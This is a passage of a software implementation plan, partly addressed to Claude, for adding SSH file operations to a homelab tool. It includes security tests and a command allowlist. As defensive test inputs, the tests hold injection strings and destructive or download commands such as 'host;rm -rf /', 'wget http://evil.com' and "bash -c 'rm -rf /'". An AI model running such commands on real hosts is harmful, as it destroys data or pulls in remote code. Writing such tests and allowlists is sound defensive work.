# Scout File Operations Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

> **📁 Organization Note:** When this plan is fully implemented and verified, move this file to `docs/plans/complete/` to keep the plans folder organized.

**Goal:** Add SSH file operations (read, list, tree, exec, find, transfer, diff) as a new `scout` action in the unified homelab tool.

**Architecture:** Extend the existing unified tool with a 6th action type (`scout`) that leverages the existing `SSHService` and connection pool for remote file operations. Follow the discriminated union schema pattern for O(1) validation.

**Tech Stack:** TypeScript, Zod, node-ssh (via existing pool), Vitest

---

## Tool Usage Examples

```typescript
// Read file
{ action: "scout", subaction: "read", host: "tootie", path: "/etc/hosts" }

// List directory
{ action: "scout", subaction: "list", host: "tootie", path: "/var/log" }

// Show directory tree
{ action: "scout", subaction: "tree", host: "tootie", path: "/home", depth: 3 }

// Execute command
{ action: "scout", subaction: "exec", host: "tootie", path: "/tmp", command: "ls -la" }

// Find files
{ action: "scout", subaction: "find", host: "tootie", path: "/var", pattern: "*.log" }

// Transfer file
{ action: "scout", subaction: "transfer", source_host: "tootie", source_path: "/tmp/file.txt", target_host: "shart", target_path: "/backup/" }

// Diff files
{ action: "scout", subaction: "diff", host1: "tootie", path1: "/etc/hosts", host2: "shart", path2: "/etc/hosts" }
```

---

## Security Requirements

### Path Validation (CWE-22 Path Traversal)

| Threat | Mitigation | Test Cases |
|--------|------------|------------|
| Path traversal (`../`) | Reject paths containing `..` | `/../etc/passwd`, `foo/../bar` |
| Null byte injection | Reject paths with `\x00` | `/etc/passwd\x00.txt` |
| Relative path escape | Require paths start with `/` | `etc/passwd`, `./foo` |
| Invalid characters | Allowlist: `a-zA-Z0-9._-/` | `$(whoami)`, `;rm -rf /` |

### Host Validation

| Threat | Mitigation | Test Cases |
|--------|------------|------------|
| Command in hostname | Block `;`, `|`, `$`, `` ` ``, `&` | `host;rm -rf /` |
| Invalid characters | Allowlist: `a-zA-Z0-9._-` | `host<script>` |

### Command Allowlist (exec subaction)

Default allowed commands (read-only):
```
cat, head, tail, grep, rg, find, ls, tree, wc, sort, uniq,
diff, stat, file, du, df, pwd, hostname, uptime, whoami
```

Override: `HOMELAB_ALLOW_ANY_COMMAND=true`

### Resource Limits

| Resource | Default | Max | Env Override |
|----------|---------|-----|--------------|
| File read size | 1MB | 10MB | `HOMELAB_MAX_FILE_SIZE` |
| Command timeout | 30s | 300s | `HOMELAB_COMMAND_TIMEOUT` |
| Tree depth | 3 | 10 | (parameter) |
| Find max results | 100 | 1000 | (parameter) |

---

## Task 1: Extend Path Security Utilities

**Files:**
- Modify: `src/utils/path-security.ts`
- Modify: `src/utils/path-security.test.ts`

### Step 1.1: Write failing tests for host validation

**File:** `src/utils/path-security.test.ts`

```typescript
describe("validateHostFormat", () => {
  // Valid hostnames
  it("allows simple hostname: myserver", () => {
    expect(() => validateHostFormat("myserver")).not.toThrow();
  });

  it("allows FQDN: server.example.com", () => {
    expect(() => validateHostFormat("server.example.com")).not.toThrow();
  });

  it("allows IP address: 192.168.1.100", () => {
    expect(() => validateHostFormat("192.168.1.100")).not.toThrow();
  });

  it("allows hostname with dash: my-server", () => {
    expect(() => validateHostFormat("my-server")).not.toThrow();
  });

  it("allows hostname with underscore: my_server", () => {
    expect(() => validateHostFormat("my_server")).not.toThrow();
  });

  // Command injection attacks
  it("throws on semicolon: host;rm -rf /", () => {
    expect(() => validateHostFormat("host;rm -rf /")).toThrow(HostSecurityError);
  });

  it("throws on pipe: host|cat /etc/passwd", () => {
    expect(() => validateHostFormat("host|cat")).toThrow(HostSecurityError);
  });

  it("throws on dollar: host$(whoami)", () => {
    expect(() => validateHostFormat("host$(whoami)")).toThrow(HostSecurityError);
  });

  it("throws on backtick: host`id`", () => {
    expect(() => validateHostFormat("host`id`")).toThrow(HostSecurityError);
  });

  it("throws on ampersand: host&rm", () => {
    expect(() => validateHostFormat("host&rm")).toThrow(HostSecurityError);
  });

  it("throws on angle brackets: host<script>", () => {
    expect(() => validateHostFormat("host<script>")).toThrow(HostSecurityError);
  });

  it("throws on empty string", () => {
    expect(() => validateHostFormat("")).toThrow(HostSecurityError);
  });
});
```

### Step 1.2: Run tests to verify they fail

**Run:** `pnpm test -- path-security`

**Expected:** FAIL - `validateHostFormat` and `HostSecurityError` not defined

### Step 1.3: Implement host validation

**File:** `src/utils/path-security.ts`

Add after existing imports:

```typescript
/**
 * Security error for invalid host format
 */
export class HostSecurityError extends Error {
  constructor(
    message: string,
    public readonly host: string
  ) {
    super(message);
    this.name = "HostSecurityError";
  }
}

// Pattern for valid hostnames: alphanumeric, dots, hyphens, underscores
const VALID_HOST_PATTERN = /^[a-zA-Z0-9._-]+$/;

// Dangerous shell characters that could enable command injection
const DANGEROUS_HOST_CHARS = /[;|$`&<>(){}[\]'"\\!#*?]/;

/**
 * Validates hostname format to prevent command injection
 *
 * @param host - Hostname to validate
 * @throws HostSecurityError if host contains dangerous characters
 */
export function validateHostFormat(host: string): void {
  if (!host || host.length === 0) {
    throw new HostSecurityError("Host cannot be empty", host);
  }

  if (DANGEROUS_HOST_CHARS.test(host)) {
    throw new HostSecurityError(
      `Invalid characters in hostname: ${host.substring(0, 50)}`,
      host
    );
  }

  if (!VALID_HOST_PATTERN.test(host)) {
    throw new HostSecurityError(
      `Invalid hostname format: ${host.substring(0, 50)}`,
      host
    );
  }
}
```

### Step 1.4: Run tests to verify they pass

**Run:** `pnpm test -- path-security`

**Expected:** PASS - All host validation tests pass

### Step 1.5: Write failing tests for shell argument escaping

**File:** `src/utils/path-security.test.ts`

```typescript
describe("escapeShellArg", () => {
  it("returns simple strings in single quotes: filename.txt", () => {
    expect(escapeShellArg("filename.txt")).toBe("'filename.txt'");
  });

  it("quotes paths with spaces", () => {
    expect(escapeShellArg("/path/with spaces/file.txt")).toBe("'/path/with spaces/file.txt'");
  });

  it("escapes single quotes by ending quote, adding escaped quote, starting new quote", () => {
    expect(escapeShellArg("file'name.txt")).toBe("'file'\\''name.txt'");
  });

  it("handles paths with special shell chars safely", () => {
    const result = escapeShellArg("$HOME/file.txt");
    expect(result).toBe("'$HOME/file.txt'");
  });

  it("handles backticks safely", () => {
    const result = escapeShellArg("`whoami`.txt");
    expect(result).toBe("'`whoami`.txt'");
  });

  it("handles subshell safely", () => {
    const result = escapeShellArg("$(id).txt");
    expect(result).toBe("'$(id).txt'");
  });

  it("handles empty string", () => {
    expect(escapeShellArg("")).toBe("''");
  });
});

describe("isSystemPath", () => {
  it("returns true for /etc/*", () => {
    expect(isSystemPath("/etc/passwd")).toBe(true);
    expect(isSystemPath("/etc/shadow")).toBe(true);
  });

  it("returns true for /bin/*", () => {
    expect(isSystemPath("/bin/bash")).toBe(true);
  });

  it("returns true for /usr/bin/*", () => {
    expect(isSystemPath("/usr/bin/python")).toBe(true);
  });

  it("returns true for /sbin/*", () => {
    expect(isSystemPath("/sbin/init")).toBe(true);
  });

  it("returns false for /home/*", () => {
    expect(isSystemPath("/home/user/file.txt")).toBe(false);
  });

  it("returns false for /tmp/*", () => {
    expect(isSystemPath("/tmp/scratch.txt")).toBe(false);
  });

  it("returns false for /var/log/*", () => {
    expect(isSystemPath("/var/log/syslog")).toBe(false);
  });
});
```

### Step 1.6: Run tests to verify they fail

**Run:** `pnpm test -- path-security`

**Expected:** FAIL - `escapeShellArg` and `isSystemPath` not defined

### Step 1.7: Implement shell escaping and system path detection

**File:** `src/utils/path-security.ts`

Add:

```typescript
/**
 * Escapes a string for safe use as a shell argument.
 * Uses single quotes with proper escaping for embedded single quotes.
 *
 * @param arg - String to escape
 * @returns Safely quoted string
 */
export function escapeShellArg(arg: string): string {
  // Single quote the entire string, escaping any embedded single quotes
  // by ending the quote, adding an escaped single quote, and starting a new quote
  return "'" + arg.replace(/'/g, "'\\''") + "'";
}

/**
 * System paths that should trigger warnings when used as transfer targets
 */
const SYSTEM_PATH_PREFIXES = [
  "/etc",
  "/bin",
  "/sbin",
  "/usr/bin",
  "/usr/sbin",
  "/lib",
  "/lib64",
  "/boot",
  "/root"
];

/**
 * Checks if a path is a system path that should be protected
 *
 * @param path - Path to check
 * @returns true if path is in a system directory
 */
export function isSystemPath(path: string): boolean {
  return SYSTEM_PATH_PREFIXES.some(
    (prefix) => path === prefix || path.startsWith(prefix + "/")
  );
}
```

### Step 1.8: Run tests to verify they pass

**Run:** `pnpm test -- path-security`

**Expected:** PASS - All new tests pass

### Step 1.9: Update exports in utils/index.ts

**File:** `src/utils/index.ts`

```typescript
export * from "./errors.js";
// Explicit named exports for better IDE support and tree-shaking
export {
  validateSecurePath,
  PathSecurityError,
  HostSecurityError,
  validateHostFormat,
  escapeShellArg,
  isSystemPath
} from "./path-security.js";
```

### Step 1.10: Commit

```bash
git add src/utils/path-security.ts src/utils/path-security.test.ts src/utils/index.ts
git commit -m "feat(security): add host validation and shell escaping utilities"
```

---

## Task 2: Add Scout Constants

**Files:**
- Modify: `src/constants.ts`
- Create: `src/constants.test.ts`

> **Note:** `src/constants.test.ts` does not exist - create it with the tests below.

### Step 2.1: Create test file for constants

**File:** `src/constants.test.ts` (CREATE)

```typescript
import { describe, it, expect } from "vitest";
import {
  DEFAULT_MAX_FILE_SIZE,
  MAX_FILE_SIZE_LIMIT,
  DEFAULT_COMMAND_TIMEOUT,
  MAX_COMMAND_TIMEOUT,
  DEFAULT_TREE_DEPTH,
  MAX_TREE_DEPTH,
  DEFAULT_FIND_LIMIT,
  MAX_FIND_LIMIT,
  ALLOWED_COMMANDS
} from "./constants.js";

describe("scout constants", () => {
  it("defines DEFAULT_MAX_FILE_SIZE as 1MB", () => {
    expect(DEFAULT_MAX_FILE_SIZE).toBe(1048576);
  });

  it("defines MAX_FILE_SIZE_LIMIT as 10MB", () => {
    expect(MAX_FILE_SIZE_LIMIT).toBe(10485760);
  });

  it("defines DEFAULT_COMMAND_TIMEOUT as 30 seconds", () => {
    expect(DEFAULT_COMMAND_TIMEOUT).toBe(30000);
  });

  it("defines MAX_COMMAND_TIMEOUT as 300 seconds", () => {
    expect(MAX_COMMAND_TIMEOUT).toBe(300000);
  });

  it("defines DEFAULT_TREE_DEPTH as 3", () => {
    expect(DEFAULT_TREE_DEPTH).toBe(3);
  });

  it("defines MAX_TREE_DEPTH as 10", () => {
    expect(MAX_TREE_DEPTH).toBe(10);
  });

  it("defines DEFAULT_FIND_LIMIT as 100", () => {
    expect(DEFAULT_FIND_LIMIT).toBe(100);
  });

  it("defines MAX_FIND_LIMIT as 1000", () => {
    expect(MAX_FIND_LIMIT).toBe(1000);
  });

  it("ALLOWED_COMMANDS contains safe read-only commands", () => {
    expect(ALLOWED_COMMANDS.has("cat")).toBe(true);
    expect(ALLOWED_COMMANDS.has("ls")).toBe(true);
    expect(ALLOWED_COMMANDS.has("grep")).toBe(true);
    expect(ALLOWED_COMMANDS.has("find")).toBe(true);
    expect(ALLOWED_COMMANDS.has("tree")).toBe(true);
    expect(ALLOWED_COMMANDS.has("head")).toBe(true);
    expect(ALLOWED_COMMANDS.has("tail")).toBe(true);
  });

  it("ALLOWED_COMMANDS does not contain dangerous commands", () => {
    expect(ALLOWED_COMMANDS.has("rm")).toBe(false);
    expect(ALLOWED_COMMANDS.has("mv")).toBe(false);
    expect(ALLOWED_COMMANDS.has("chmod")).toBe(false);
    expect(ALLOWED_COMMANDS.has("wget")).toBe(false);
    expect(ALLOWED_COMMANDS.has("curl")).toBe(false);
    expect(ALLOWED_COMMANDS.has("bash")).toBe(false);
  });
});
```

### Step 2.2: Run tests to verify they fail

**Run:** `pnpm test -- constants.test`

**Expected:** FAIL - Constants not defined

### Step 2.3: Add constants

**File:** `src/constants.ts`

Add after existing constants:

```typescript
// ===== Scout File Operations Constants =====

// File size limits (bytes)
export const DEFAULT_MAX_FILE_SIZE = 1048576; // 1MB
export const MAX_FILE_SIZE_LIMIT = 10485760;  // 10MB

// Command timeout limits (milliseconds)
export const DEFAULT_COMMAND_TIMEOUT = 30000;  // 30s
export const MAX_COMMAND_TIMEOUT = 300000;     // 300s (5 min)

// Tree depth limits
export const DEFAULT_TREE_DEPTH = 3;
export const MAX_TREE_DEPTH = 10;

// Find result limits
export const DEFAULT_FIND_LIMIT = 100;
export const MAX_FIND_LIMIT = 1000;

// Allowed commands for exec subaction (read-only operations)
export const ALLOWED_COMMANDS = new Set([
  "cat",
  "head",
  "tail",
  "grep",
  "rg",
  "find",
  "ls",
  "tree",
  "wc",
  "sort",
  "uniq",
  "diff",
  "stat",
  "file",
  "du",
  "df",
  "pwd",
  "hostname",
  "uptime",
  "whoami"
]);

// Environment variable to disable command allowlist
export const ENV_ALLOW_ANY_COMMAND = "HOMELAB_ALLOW_ANY_COMMAND";
```

### Step 2.4: Run tests to verify they pass

**Run:** `pnpm test -- constants.test`

**Expected:** PASS

### Step 2.5: Commit

```bash
git add src/constants.ts src/constants.test.ts
git commit -m "feat(scout): add constants for file operations limits"
```

---

## Task 3: Add Scout Zod Schemas

**Files:**
- Modify: `src/schemas/unified.ts`
- Modify: `src/schemas/unified.test.ts`

### Step 3.1: Write failing tests for scout schemas

**File:** `src/schemas/unified.test.ts`

Add new describe block:

```typescript
describe("scout action schemas", () => {
  describe("scout:read", () => {
    it("validates required host and path", () => {
      const result = UnifiedHomelabSchema.safeParse({
        action: "scout",
        subaction: "read",
        host: "tootie",
        path: "/etc/hosts"
      });
      expect(result.success).toBe(true);
    });

    it("accepts optional max_size", () => {
      const result = UnifiedHomelabSchema.safeParse({
        action: "scout",
        subaction: "read",
        host: "tootie",
        path: "/var/log/syslog",
        max_size: 512000
      });
      expect(result.success).toBe(true);
    });

    it("rejects missing host", () => {
      const result = UnifiedHomelabSchema.safeParse({
        action: "scout",
        subaction: "read",
        path: "/etc/hosts"
      });
      expect(result.success).toBe(false);
    });

    it("rejects missing path", () => {
      const result = UnifiedHomelabSchema.safeParse({
        action: "scout",
        subaction: "read",
        host: "tootie"
      });
      expect(result.success).toBe(false);
    });
  });

  describe("scout:list", () => {
    it("validates host and path", () => {
      const result = UnifiedHomelabSchema.safeParse({
        action: "scout",
        subaction: "list",
        host: "tootie",
        path: "/var/log"
      });
      expect(result.success).toBe(true);
    });
  });

  describe("scout:tree", () => {
    it("validates with optional depth", () => {
      const result = UnifiedHomelabSchema.safeParse({
        action: "scout",
        subaction: "tree",
        host: "tootie",
        path: "/home",
        depth: 3
      });
      expect(result.success).toBe(true);
    });

    it("rejects depth > MAX_TREE_DEPTH", () => {
      const result = UnifiedHomelabSchema.safeParse({
        action: "scout",
        subaction: "tree",
        host: "tootie",
        path: "/home",
        depth: 15
      });
      expect(result.success).toBe(false);
    });
  });

  describe("scout:exec", () => {
    it("validates with command", () => {
      const result = UnifiedHomelabSchema.safeParse({
        action: "scout",
        subaction: "exec",
        host: "tootie",
        path: "/tmp",
        command: "ls -la"
      });
      expect(result.success).toBe(true);
    });

    it("accepts optional timeout", () => {
      const result = UnifiedHomelabSchema.safeParse({
        action: "scout",
        subaction: "exec",
        host: "tootie",
        path: "/tmp",
        command: "find . -name '*.log'",
        timeout: 60000
      });
      expect(result.success).toBe(true);
    });
  });

  describe("scout:find", () => {
    it("validates with pattern", () => {
      const result = UnifiedHomelabSchema.safeParse({
        action: "scout",
        subaction: "find",
        host: "tootie",
        path: "/var",
        pattern: "*.log"
      });
      expect(result.success).toBe(true);
    });

    it("accepts optional type and max_depth", () => {
      const result = UnifiedHomelabSchema.safeParse({
        action: "scout",
        subaction: "find",
        host: "tootie",
        path: "/var",
        pattern: "*.log",
        type: "f",
        max_depth: 5
      });
      expect(result.success).toBe(true);
    });
  });

  describe("scout:transfer", () => {
    it("validates source and target", () => {
      const result = UnifiedHomelabSchema.safeParse({
        action: "scout",
        subaction: "transfer",
        source_host: "tootie",
        source_path: "/tmp/file.txt",
        target_host: "shart",
        target_path: "/backup/"
      });
      expect(result.success).toBe(true);
    });

    it("rejects missing target_host", () => {
      const result = UnifiedHomelabSchema.safeParse({
        action: "scout",
        subaction: "transfer",
        source_host: "tootie",
        source_path: "/tmp/file.txt",
        target_path: "/backup/"
      });
      expect(result.success).toBe(false);
    });
  });

  describe("scout:diff", () => {
    it("validates two paths on different hosts", () => {
      const result = UnifiedHomelabSchema.safeParse({
        action: "scout",
        subaction: "diff",
        host1: "tootie",
        path1: "/etc/hosts",
        host2: "shart",
        path2: "/etc/hosts"
      });
      expect(result.success).toBe(true);
    });

    it("accepts context_lines option", () => {
      const result = UnifiedHomelabSchema.safeParse({
        action: "scout",
        subaction: "diff",
        host1: "tootie",
        path1: "/etc/hosts",
        host2: "shart",
        path2: "/etc/hosts",
        context_lines: 5
      });
      expect(result.success).toBe(true);
    });
  });
});
```

### Step 3.2: Run tests to verify they fail

**Run:** `pnpm test -- unified.test`

**Expected:** FAIL - Scout schemas not defined

### Step 3.3: Implement scout schemas

**File:** `src/schemas/unified.ts`

Add after image schemas, before `UnifiedHomelabUnion`:

```typescript
// ===== Scout subactions =====
import {
  DEFAULT_MAX_FILE_SIZE,
  MAX_FILE_SIZE_LIMIT,
  DEFAULT_COMMAND_TIMEOUT,
  MAX_COMMAND_TIMEOUT,
  DEFAULT_TREE_DEPTH,
  MAX_TREE_DEPTH,
  DEFAULT_FIND_LIMIT,
  MAX_FIND_LIMIT
} from "../constants.js";

const scoutReadSchema = z.object({
  action_subaction: z.literal("scout:read"),
  action: z.literal("scout"),
  subaction: z.literal("read"),
  host: z.string().min(1).describe("Target host name"),
  path: z.string().min(1).describe("Absolute path to file"),
  max_size: z
    .number()
    .int()
    .min(1)
    .max(MAX_FILE_SIZE_LIMIT)
    .default(DEFAULT_MAX_FILE_SIZE)
    .describe("Maximum file size to read in bytes"),
  response_format: responseFormatSchema
});

const scoutListSchema = z.object({
  action_subaction: z.literal("scout:list"),
  action: z.literal("scout"),
  subaction: z.literal("list"),
  host: z.string().min(1).describe("Target host name"),
  path: z.string().min(1).describe("Absolute path to directory"),
  all: z.boolean().default(false).describe("Include hidden files"),
  response_format: responseFormatSchema
});

const scoutTreeSchema = z.object({
  action_subaction: z.literal("scout:tree"),
  action: z.literal("scout"),
  subaction: z.literal("tree"),
  host: z.string().min(1).describe("Target host name"),
  path: z.string().min(1).describe("Absolute path to directory"),
  depth: z
    .number()
    .int()
    .min(1)
    .max(MAX_TREE_DEPTH)
    .default(DEFAULT_TREE_DEPTH)
    .describe("Maximum depth to traverse"),
  response_format: responseFormatSchema
});

const scoutExecSchema = z.object({
  action_subaction: z.literal("scout:exec"),
  action: z.literal("scout"),
  subaction: z.literal("exec"),
  host: z.string().min(1).describe("Target host name"),
  path: z.string().min(1).describe("Working directory for command"),
  command: z.string().min(1).describe("Command to execute"),
  timeout: z
    .number()
    .int()
    .min(1000)
    .max(MAX_COMMAND_TIMEOUT)
    .default(DEFAULT_COMMAND_TIMEOUT)
    .describe("Command timeout in milliseconds"),
  response_format: responseFormatSchema
});

const scoutFindSchema = z.object({
  action_subaction: z.literal("scout:find"),
  action: z.literal("scout"),
  subaction: z.literal("find"),
  host: z.string().min(1).describe("Target host name"),
  path: z.string().min(1).describe("Starting directory for search"),
  pattern: z.string().min(1).describe("Filename pattern (glob)"),
  type: z.enum(["f", "d", "l"]).optional().describe("File type: f=file, d=directory, l=symlink"),
  max_depth: z
    .number()
    .int()
    .min(1)
    .max(MAX_TREE_DEPTH)
    .optional()
    .describe("Maximum search depth"),
  limit: z
    .number()
    .int()
    .min(1)
    .max(MAX_FIND_LIMIT)
    .default(DEFAULT_FIND_LIMIT)
    .describe("Maximum results to return"),
  response_format: responseFormatSchema
});

const scoutTransferSchema = z.object({
  action_subaction: z.literal("scout:transfer"),
  action: z.literal("scout"),
  subaction: z.literal("transfer"),
  source_host: z.string().min(1).describe("Source host name"),
  source_path: z.string().min(1).describe("Source file path"),
  target_host: z.string().min(1).describe("Target host name"),
  target_path: z.string().min(1).describe("Target file path or directory")
});

const scoutDiffSchema = z.object({
  action_subaction: z.literal("scout:diff"),
  action: z.literal("scout"),
  subaction: z.literal("diff"),
  host1: z.string().min(1).describe("First host name"),
  path1: z.string().min(1).describe("First file path"),
  host2: z.string().min(1).describe("Second host name"),
  path2: z.string().min(1).describe("Second file path"),
  context_lines: z
    .number()
    .int()
    .min(0)
    .max(20)
    .default(3)
    .describe("Context lines around changes"),
  response_format: responseFormatSchema
});
```

### Step 3.4: Add scout schemas to discriminated union

**File:** `src/schemas/unified.ts`

Update `UnifiedHomelabUnion`:

```typescript
const UnifiedHomelabUnion = z.discriminatedUnion("action_subaction", [
  // Container actions (12 schemas)
  containerListSchema,
  containerStartSchema,
  containerStopSchema,
  containerRestartSchema,
  containerPauseSchema,
  containerUnpauseSchema,
  containerLogsSchema,
  containerStatsSchema,
  containerInspectSchema,
  containerSearchSchema,
  containerPullSchema,
  containerRecreateSchema,
  // Compose actions (9 schemas)
  composeListSchema,
  composeStatusSchema,
  composeUpSchema,
  composeDownSchema,
  composeRestartSchema,
  composeLogsSchema,
  composeBuildSchema,
  composeRecreateSchema,
  composePullSchema,
  // Host actions (2 schemas)
  hostStatusSchema,
  hostResourcesSchema,
  // Docker actions (3 schemas)
  dockerInfoSchema,
  dockerDfSchema,
  dockerPruneSchema,
  // Image actions (4 schemas)
  imageListSchema,
  imagePullSchema,
  imageBuildSchema,
  imageRemoveSchema,
  // Scout actions (7 schemas)
  scoutReadSchema,
  scoutListSchema,
  scoutTreeSchema,
  scoutExecSchema,
  scoutFindSchema,
  scoutTransferSchema,
  scoutDiffSchema
]);
```

### Step 3.5: Export scout schemas

**File:** `src/schemas/unified.ts`

Add to exports:

```typescript
export {
  // ... existing exports ...
  scoutReadSchema,
  scoutListSchema,
  scoutTreeSchema,
  scoutExecSchema,
  scoutFindSchema,
  scoutTransferSchema,
  scoutDiffSchema
};
```

### Step 3.6: Run tests to verify they pass

**Run:** `pnpm test -- unified.test`

**Expected:** PASS

### Step 3.7: Commit

```bash
git add src/schemas/unified.ts src/schemas/unified.test.ts
git commit -m "feat(scout): add Zod schemas for file operations"
```

---

## Task 4: Create FileService Interface and Implementation

**Files:**
- Modify: `src/services/interfaces.ts`
- Create: `src/services/file-service.ts`
- Create: `src/services/file-service.test.ts`

### Step 4.1: Write failing tests for FileService

**File:** `src/services/file-service.test.ts`

```typescript
import { describe, it, expect, vi, beforeEach } from "vitest";
import { FileService } from "./file-service.js";
import type { ISSHService } from "./interfaces.js";
import type { HostConfig } from "../types.js";

describe("FileService", () => {
  let fileService: FileService;
  let mockSSHService: ISSHService;
  let testHost: HostConfig;

  beforeEach(() => {
    mockSSHService = {
      executeSSHCommand: vi.fn(),
      getHostResources: vi.fn()
    };
    fileService = new FileService(mockSSHService);
    testHost = {
      name: "testhost",
      host: "192.168.1.100",
      protocol: "ssh",
      sshUser: "testuser"
    };
  });

  describe("readFile", () => {
    it("reads file content via cat command", async () => {
      vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue("file content here");

      const result = await fileService.readFile(testHost, "/etc/hosts", 1048576);

      expect(mockSSHService.executeSSHCommand).toHaveBeenCalledWith(
        testHost,
        expect.stringContaining("cat"),
        [],
        expect.any(Object)
      );
      expect(result.content).toBe("file content here");
      expect(result.truncated).toBe(false);
    });

    it("truncates content exceeding maxSize", async () => {
      const longContent = "x".repeat(2000);
      vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue(longContent);

      const result = await fileService.readFile(testHost, "/tmp/big.txt", 1000);

      expect(result.content.length).toBeLessThanOrEqual(1000);
      expect(result.truncated).toBe(true);
    });

    it("returns size and truncated flag", async () => {
      vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue("test");

      const result = await fileService.readFile(testHost, "/tmp/test.txt", 1048576);

      expect(result).toHaveProperty("size");
      expect(result).toHaveProperty("truncated");
    });
  });

  describe("listDirectory", () => {
    it("returns ls -la output", async () => {
      const lsOutput = "total 4\ndrwxr-xr-x 2 root root 4096 Jan 1 00:00 .\n";
      vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue(lsOutput);

      const result = await fileService.listDirectory(testHost, "/var/log", false);

      expect(mockSSHService.executeSSHCommand).toHaveBeenCalledWith(
        testHost,
        expect.stringContaining("ls"),
        [],
        expect.any(Object)
      );
      expect(result).toBe(lsOutput);
    });
  });

  describe("treeDirectory", () => {
    it("returns tree output with depth limit", async () => {
      const treeOutput = ".\n├── dir1\n└── file.txt\n";
      vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue(treeOutput);

      const result = await fileService.treeDirectory(testHost, "/home", 3);

      expect(mockSSHService.executeSSHCommand).toHaveBeenCalledWith(
        testHost,
        expect.stringContaining("-L 3"),
        [],
        expect.any(Object)
      );
      expect(result).toBe(treeOutput);
    });
  });

  describe("executeCommand", () => {
    it("executes command in working directory", async () => {
      vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue("output");

      const result = await fileService.executeCommand(
        testHost,
        "/tmp",
        "ls -la",
        30000
      );

      expect(mockSSHService.executeSSHCommand).toHaveBeenCalledWith(
        testHost,
        expect.stringContaining("cd"),
        [],
        { timeoutMs: 30000 }
      );
      expect(result.stdout).toBe("output");
    });

    describe("command allowlist", () => {
      it("allows: cat, head, tail, grep, ls, tree, find", async () => {
        vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue("ok");

        for (const cmd of ["cat file", "head -n 10 file", "ls -la", "grep pattern file"]) {
          await expect(
            fileService.executeCommand(testHost, "/tmp", cmd, 30000)
          ).resolves.not.toThrow();
        }
      });

      it("blocks: rm, mv, cp, chmod, chown", async () => {
        for (const cmd of ["rm -rf /", "mv file dest", "chmod 777 file"]) {
          await expect(
            fileService.executeCommand(testHost, "/tmp", cmd, 30000)
          ).rejects.toThrow(/not in allowed list/);
        }
      });

      it("blocks: wget, curl (network commands)", async () => {
        for (const cmd of ["wget http://evil.com", "curl http://evil.com"]) {
          await expect(
            fileService.executeCommand(testHost, "/tmp", cmd, 30000)
          ).rejects.toThrow(/not in allowed list/);
        }
      });

      it("blocks: python, node, bash, sh (interpreters)", async () => {
        for (const cmd of ["python -c 'bad'", "bash -c 'rm -rf /'"]) {
          await expect(
            fileService.executeCommand(testHost, "/tmp", cmd, 30000)
          ).rejects.toThrow(/not in allowed list/);
        }
      });

      it("allows any command when HOMELAB_ALLOW_ANY_COMMAND=true", async () => {
        process.env.HOMELAB_ALLOW_ANY_COMMAND = "true";
        vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue("ok");

        await expect(
          fileService.executeCommand(testHost, "/tmp", "rm -rf /tmp/test", 30000)
        ).resolves.not.toThrow();

        delete process.env.HOMELAB_ALLOW_ANY_COMMAND;
      });
    });
  });

  describe("findFiles", () => {
    it("searches with pattern", async () => {
      vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue("/var/log/syslog\n/var/log/auth.log");

      const result = await fileService.findFiles(testHost, "/var", "*.log", {});

      expect(mockSSHService.executeSSHCommand).toHaveBeenCalledWith(
        testHost,
        expect.stringContaining("-name"),
        [],
        expect.any(Object)
      );
      expect(result).toContain("/var/log/syslog");
    });
  });

  describe("transferFile", () => {
    it("transfers file between hosts via scp", async () => {
      vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue("100");

      const sourceHost = { ...testHost, name: "source" };
      const targetHost = { ...testHost, name: "target", host: "192.168.1.101" };

      const result = await fileService.transferFile(
        sourceHost,
        "/tmp/file.txt",
        targetHost,
        "/backup/"
      );

      expect(result.bytesTransferred).toBeGreaterThanOrEqual(0);
    });

    describe("transfer security", () => {
      it("warns on system path targets: /etc, /bin", async () => {
        vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue("100");

        const result = await fileService.transferFile(
          testHost,
          "/tmp/file.txt",
          testHost,
          "/etc/hosts"
        );

        expect(result.warning).toContain("system path");
      });
    });
  });

  describe("diffFiles", () => {
    it("returns unified diff output", async () => {
      const diffOutput = "--- a/hosts\n+++ b/hosts\n@@ -1,2 +1,3 @@\n localhost\n+newhost";
      vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue(diffOutput);

      const result = await fileService.diffFiles(
        testHost, "/etc/hosts",
        testHost, "/tmp/hosts",
        3
      );

      expect(result).toContain("---");
      expect(result).toContain("+++");
    });
  });

  describe("security", () => {
    it("all methods validate paths before execution", async () => {
      await expect(
        fileService.readFile(testHost, "/../etc/passwd", 1000)
      ).rejects.toThrow(/traversal|invalid/i);

      await expect(
        fileService.listDirectory(testHost, "/var/../etc", false)
      ).rejects.toThrow(/traversal|invalid/i);
    });

    it("all methods escape shell arguments", async () => {
      vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue("ok");

      await fileService.readFile(testHost, "/tmp/file with spaces.txt", 1000);

      expect(mockSSHService.executeSSHCommand).toHaveBeenCalledWith(
        testHost,
        expect.stringContaining("'"),  // Single quotes indicate escaping
        [],
        expect.any(Object)
      );
    });
  });
});
```

### Step 4.2: Run tests to verify they fail

**Run:** `pnpm test -- file-service`

**Expected:** FAIL - FileService not defined

### Step 4.3: Add IFileService interface

**File:** `src/services/interfaces.ts`

Add before the closing of the file:

```typescript
/**
 * File service interface for remote file operations via SSH.
 * Provides read, list, exec, find, transfer, and diff operations.
 */
export interface IFileService {
  /**
   * Read file content from remote host.
   *
   * @param host - Host configuration
   * @param path - Absolute path to file
   * @param maxSize - Maximum bytes to read
   * @returns File content with metadata
   */
  readFile(
    host: HostConfig,
    path: string,
    maxSize: number
  ): Promise<{ content: string; size: number; truncated: boolean }>;

  /**
   * List directory contents.
   *
   * @param host - Host configuration
   * @param path - Absolute path to directory
   * @param showHidden - Include hidden files
   * @returns ls -la output
   */
  listDirectory(host: HostConfig, path: string, showHidden: boolean): Promise<string>;

  /**
   * Show directory tree.
   *
   * @param host - Host configuration
   * @param path - Absolute path to directory
   * @param depth - Maximum depth
